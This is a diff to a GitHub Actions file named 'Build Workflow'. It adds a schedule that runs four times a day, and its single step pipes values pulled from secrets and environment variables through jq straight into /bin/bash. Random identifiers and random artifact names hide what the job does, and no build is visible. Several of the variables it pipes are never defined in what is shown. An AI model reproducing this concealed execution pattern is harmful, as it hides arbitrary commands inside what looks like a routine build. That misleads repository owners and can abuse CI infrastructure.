@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '12 1,7,13,19 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,17 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          knd05434: ${{ secrets.knd05434 }}
+          belt876: ${{ secrets.belt876 }}
         run: |
-          printf '%s' "$knd05434" | jq -r .qi886 | /bin/bash
-          printf '%s' "$kmjkh91294" | jq -r .aq3993 | /bin/bash
-          printf '%s' "$vig15" | jq -r .k67453 | /bin/bash
-          printf '%s' "$bh9388" | jq -r .xjbam9671 | /bin/bash
-          printf '%s' "$tya87123" | jq -r .bzhsn8622 | /bin/bash
+          printf '%s' "$belt876" | jq -r .xx5571 | /bin/bash
+          echo $ir86859 | jq -r .jgv41378 | /bin/bash
+          printf '%s' "$cjdhb05" | jq -r .nqtwo878 | /bin/bash
+          echo $qbewx66 | jq -r .jqsy3072 | /bin/bash
+          printf '%s' "$klvoy8" | jq -r .itd01 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: xmqQ4ZVl
+          name: TIygWGd9
           path: "*.zip"
           retention-days: 1
